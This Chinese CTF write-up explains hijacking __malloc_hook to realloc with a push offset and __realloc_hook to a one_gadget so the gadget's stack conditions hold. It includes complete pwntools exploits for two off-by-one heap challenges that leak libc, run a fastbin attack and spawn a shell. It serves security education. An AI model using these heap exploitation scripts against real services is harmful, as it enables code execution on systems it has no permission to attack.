# 通过 realloc_hook 调整栈帧使 onegadget 生效

在某些堆的题目当中，由于限制只能使用 house of spirit 等方法劫持 malloc_hook ，这种情况一般是往 malloc_hook 写入 onegadget ，再次申请堆来 getshell 。

由于栈帧情况不满足，查询到的所有 onegadget 可能都打不通，这时就可以考虑下用 malloc_hook 和 realloc_hook 结合。先通过 realloc 调整栈帧，然后在运行 onegadget 。

## 了解 realloc

realloc 在库函数中的作用是重新调整 malloc 或 calloc 所分配的堆大小。它和 malloc 函数一样有 hook 函数，当 hook 函数不为空时，就会跳转运行 hook 函数（和 malloc_hook 一样的）。

```c
__int64 __fastcall realloc(signed __int64 a1, unsigned __int64 a2, __int64 a3)
{
	……
	if ( _realloc_hook )
	return _realloc_hook(a1, a2, retaddr);
    ……
```

看看 realloc 的汇编代码：（可以把 libc 拖到 ida 中看，也可以泄露地址后 gdb 调试查看 ``x /20i [addr]``）

```
.text:00000000000846C0 realloc         proc near               ; DATA XREF: LOAD:0000000000006BA0↑o
.text:00000000000846C0 ; __unwind {
.text:00000000000846C0                 push    r15             ; Alternative name is '__libc_realloc'
.text:00000000000846C2                 push    r14
.text:00000000000846C4                 push    r13
.text:00000000000846C6                 push    r12
.text:00000000000846C8                 mov     r13, rsi
.text:00000000000846CB                 push    rbp
.text:00000000000846CC                 push    rbx
.text:00000000000846CD                 mov     rbx, rdi
.text:00000000000846D0                 sub     rsp, 38h
.text:00000000000846D4                 mov     rax, cs:__realloc_hook_ptr
.text:00000000000846DB                 mov     rax, [rax]
.text:00000000000846DE                 test    rax, rax
.text:00000000000846E1                 jnz     loc_848E8		; 跳转执行 realloc_hook
.text:00000000000846E7                 test    rsi, rsi
.text:00000000000846EA                 jnz     short loc_846F5
.text:00000000000846EC                 test    rdi, rdi
.text:00000000000846EF                 jnz     loc_84960
```

函数一开始有很多的 push ，realloc 函数先执行 push 压栈，然后在跳转执行 realloc_hook 存储的函数。我们就是利用这些 push 调整栈帧。push 的数量发生变化会影响 rsp 的地址，这样就可以控制 rsp 的取值，从而满足 onegadget 的执行条件。除了可以控制 push 数量，还能通过偏移得到其他的 ``push xxx`` 。

## malloc_hook 与 realloc_hook 配合

将 malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget ，实际运行顺序：

```
malloc -> malloc_hook -> realloc -> realloc_hook -> onegadget
```

这样就能经过 realloc 调整栈帧后再运行 onegadget 。实际情况中，并不是直接劫持 malloc_hook 为 realloc ，而是要加上一定的偏移，也就是调整 push 的数量，让栈帧结构满足 onegadget 运行。

realloc 这个偏移做题还是逐个试感觉快一点，因为设想是**少一个 push ，rsp 就会向前移动一个内存单元，对应的 ``[rsp+0x30]=[rsp+0x38]``** ，但实际上有少部分位置可能被其他东西写入改变了原来的值。自行调试体会一下：

```shell
# 6个push
pwndbg> x /20gx $rsp
0x7fffffffdcb8:	0x00007ffff7a9195f	0x00007fffffffdd20
0x7fffffffdcc8:	0x00005555555548e0	0x00007fffffffde40
0x7fffffffdcd8:	0x0000000000000000	0x0000000000000000
0x7fffffffdce8:	0x00007ffff7a43ea0	0x00007fffffffde40
0x7fffffffdcf8:	0x0000000000000000	0x00007fffffffdd40
0x7fffffffdd08:	0x00005555555548e0	0x00007fffffffde40
0x7fffffffdd18:	0x0000000000000000	0x0000000000000000
0x7fffffffdd28:	0x0000555555554b71	0x00005555555548e0
0x7fffffffdd38:	0x0000001000000006	0x00007fffffffdd60
0x7fffffffdd48:	0x0000555555554f86	0x00007fffffffde40

# 5个push
pwndbg> x /20gx $rsp
0x7fffffffdcc0:	0x00007ffff7a9195f	0x00005555555548e0
0x7fffffffdcd0:	0x00007fffffffde40	0x0000000000000000
0x7fffffffdce0:	0x0000000000000000	0x00007ffff7a43ea0
0x7fffffffdcf0:	0x00007fffffffde40	0x0000555555554a23
0x7fffffffdd00:	0x0000000000000000	0x00007fffffffdd40
0x7fffffffdd10:	0x00005555555548e0	0x00007fffffffde40
0x7fffffffdd20:	0x0000000000000000	0x0000555555554b71
0x7fffffffdd30:	0x00005555555548e0	0x0000001000000006
0x7fffffffdd40:	0x00007fffffffdd60	0x0000555555554f86
0x7fffffffdd50:	0x00007fffffffde40	0x0000000100000000
```

原理上是：**少一个 push ，rsp 就会向前移动一个内存单元，对应的 ``[rsp+0x30]=[rsp+0x38]``**，但实际部分位置的值会变，所以逐个试，速度可能比计算快。



## 例题

### [V&N2020 公开赛]simpleHeap

#### 基本功能

一个基本的堆管理器，有增删查改功能。各项功能都是基于下标序号定位操作，上限为10个堆，大小为大于 0 、小于等于 0x6f 。没有结构体，基于两个列表存储堆信息。

#### 漏洞

在修改函数里，调用函数 sub_C39 完成对堆信息的修改。传入的参数如下：

```c
sub_C39((__int64)chunk_ptr_list[v1], chunk_size_list[v1])
```

在处理边界问题时，错误使用判断条件，导致溢出 1 字节，正确应该``if(i>=size)``，具体逻辑如下：

```c
__int64 __fastcall sub_C39(__int64 ptr, int size)
{
  __int64 result; // rax
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = (unsigned int)i;
    if ( i > size )                             // off by one
      break;
    if ( !read(0, (void *)(i + ptr), 1uLL) )    // 输出错误的异常处理
      exit(0);
    if ( *(_BYTE *)(i + ptr) == '\n' )
    {
      result = i + ptr;
      *(_BYTE *)result = 0;
      return result;
    }
  }
  return result;
}
```

#### 思路

使用 off by one 伪造 chunk size，造成 chunk extend ，再利用 unsorted bin 的特点，泄露出 unsorted bin fd 指针的 libc 地址。

将上一步中的 chunk extend 剩下在 bin 中的内存申请出来，造成两个指针指向同一个地址，配合 edit 功能实现 houst of spirit ，劫持 \_\_malloc_hook 。

实际测试后全部 onegadget 因为栈环境问题都无法打通，需要结合 malloc_hook 、 realloc_hook 调整栈环境才能打通。

---

溢出修改 chunk size 造成 chunk extend ，chunk0 用于溢出 chunk1 ，chunk2 用于读取 unsorted bin fd 指针，chunk3 防止 fake chunk 与 topchunk 合并。溢出 size 是经过计算符合 house of spirit 要求：

```python
create(0x18,'s')
create(0x48,'k')
create(0x68,'y')#2
create(0x10,'e')

payload = 'a'*0x18 + '\xc1'
edit(0,payload)

free(1)
create(0x48,'yyds')
show(2)
```

泄露 libc 地址后，将 bin 中剩余内存申请出来，该指针与 chunk2 指向相同地址，任选其一释放，再用另外一个修改 fastbin fd 指针：

```python
create(0x68,'skye')#4
free(4)
payload = p64(malloc_hook-27-8)+'\n'
edit(2,payload)
```

正常来说将 malloc_hook 劫持为 onegadget 即可，但是测试发现这条题目的栈环境不满足全部 onegadget 条件，这就需要调整阵结构，使 onegadget 生效。**需要配合使用 realloc_hook 和 malloc_hook。**

将 malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget 。然后通过多次尝试确定偏移为 12 。

#### EXP

```python
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
p = process("./vn_pwn_simpleHeap")
# p = remote("node3.buuoj.cn",29864)
elf = ELF("./vn_pwn_simpleHeap")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# libc = ELF("./libc-2.23.so")

def create(size,content):
	p.sendlineafter("choice: ",'1')
	p.sendlineafter('?',str(size))
	p.sendafter(':',content)
def edit(id,content):
	p.sendlineafter("choice: ",'2')
	p.sendlineafter('?',str(id))
	p.sendafter(':',content)
def show(id):
	p.sendlineafter("choice: ",'3')
	p.sendlineafter('?',str(id))
def free(id):
	p.sendlineafter("choice: ",'4')
	p.sendlineafter('?',str(id))

create(0x18,'s')
create(0x48,'k')
create(0x68,'y')#2
create(0x10,'e')

payload = 'a'*0x18 + '\xc1'
edit(0,payload)

free(1)
create(0x48,'yyds')
show(2)

leak_addr = u64(p.recv(6).ljust(8,'\x00'))
log.info("leak_addr:"+hex(leak_addr))
libc_base = leak_addr - 0x3c4b78
malloc_hook = libc_base + libc.sym['__malloc_hook']
log.info("malloc_hook:"+hex(malloc_hook))
realloc_hook = libc_base + libc.sym['__realloc_hook']
log.info("realloc_hook:"+hex(realloc_hook))
realloc = libc_base + libc.sym['realloc']
log.info("realloc:"+hex(realloc))

create(0x68,'skye')#4
free(4)
payload = p64(malloc_hook-27-8)+'\n'
edit(2,payload)

create(0x68,'a')
create(0x68,'b')#5

one = [0x45226,0x4527a,0xf0364,0xf1207]
# one = [0x45216,0x4526a,0xf02a4,0xf1147]
onegadget = libc_base + one[1]
log.info("one:"+hex(onegadget))

payload = 'a'*11 + p64(onegadget) + p64(realloc+12) + '\n'
edit(5,payload)


gdb.attach(p)
# create(0x10,'skye,yyds')
p.sendlineafter("choice: ",'1')
p.sendlineafter('?',str(0x10))


p.interactive()
```

### roarctf_2019_easy_pwn

#### 基本功能

一个堆管理器，有增删查改功能。所有功能都是基于列表的下标定位操作对象。用 3 个列表维护堆：chunk_inuse、chunk_size、chunk_ptr。

#### 漏洞

在 edit 功能里面 sub_E26 函数，这个函数用来处理输入长度的，具体代码如下：

```c
__int64 __fastcall check_size(signed int size, unsigned int input_length)
{
  __int64 result; // rax

  if ( size > (signed int)input_length )
    return input_length;
  if ( input_length - size == 10 )
    LODWORD(result) = size + 1;	//off by one
  else
    LODWORD(result) = size;
  return (unsigned int)result;
}
```

当我们要求写入的长度（input_length）大于堆 size 10 个字节时，就可以写入 size + 1 字节，造成 off by one 。

#### 思路

这条题目和 ``[V&N2020 公开赛]simpleHeap`` 思路一样。

使用 off by one 伪造 chunk size，造成 chunk extend ，再利用 unsorted bin 的特点，泄露出 unsorted bin fd 指针的 libc 地址。

将上一步中的 chunk extend 剩下在 bin 中的内存申请出来，造成两个指针指向同一个地址，配合 edit 功能实现 houst of spirit ，劫持 \_\_malloc_hook 。

实际测试后全部 onegadget 因为栈环境问题都无法打通，需要结合 malloc_hook 、 realloc_hook 调整栈环境才能打通。

#### EXP

```python
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
# p = process("./roarctf_2019_easy_pwn")
p = remote("node3.buuoj.cn",29259)
elf = ELF("./roarctf_2019_easy_pwn")
libc = ELF("./libc-2.23.so")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


def create(size):
    p.recvuntil("choice: ")
    p.sendline("1")
    p.recvuntil(": ")
    p.sendline(str(size))
def edit(index,size,content):
    p.recvuntil("choice: ")
    p.sendline("2")
    p.recvuntil(": ")
    p.sendline(str(index))
    p.recvuntil(": ")
    p.sendline(str(size))
    p.recvuntil(": ")
    p.send(content)
def free(index):
    p.recvuntil(": ")
    p.sendline("3")
    p.recvuntil(": ")
    p.sendline(str(index))
def show(index):
    p.recvuntil(": ")
    p.sendline("4")
    p.recvuntil(": ")
    p.sendline(str(index))

create(0x18)#overwrite
create(0x68)
create(0x68)#2
create(0x10)#protect

payload = 'a'*0x18 + '\xe1'
edit(0,len(payload)-1+10,payload)

free(1)
create(0x68)
show(2)
p.recvuntil("content: ")
leak_addr = u64(p.recv(6).ljust(8,'\x00'))
log.info("leak_addr:"+hex(leak_addr))
libc_base = leak_addr - 0x3c4b78
malloc_hook = libc_base + libc.sym['__malloc_hook']
log.info("malloc_hook:"+hex(malloc_hook))
realloc = libc_base + libc.sym['realloc']
log.info("realloc:"+hex(realloc))
realloc_hook = libc_base + libc.sym['__realloc_hook']
log.info("realloc_hook:"+hex(realloc_hook))

create(0x68)
free(4)

payload = p64(malloc_hook-27-8)
edit(2,len(payload),payload)

create(0x68)
create(0x68)
# one = [0x45226,0x4527a,0xf0364,0xf1207]
one = [0x45216,0x4526a,0xf02a4,0xf1147]
onegadget = libc_base + one[1]
log.info("onegadget:"+hex(onegadget))
payload = 'a'*11 + p64(onegadget) + p64(realloc)
edit(5,len(payload),payload)

create(0x10)

# gdb.attach(p)
p.interactive()
```

## 参考文章

* [[原创]堆的六种利用手法](https://bbs.pediy.com/thread-246786.htm)
* [[pwn]堆：realloc_hook控制栈结构达成onegadget](https://blog.csdn.net/breeze_cat/article/details/103789081)
* [pwn学习系列之Extend the chunk及realloc_hook利用](https://xz.aliyun.com/t/6559)

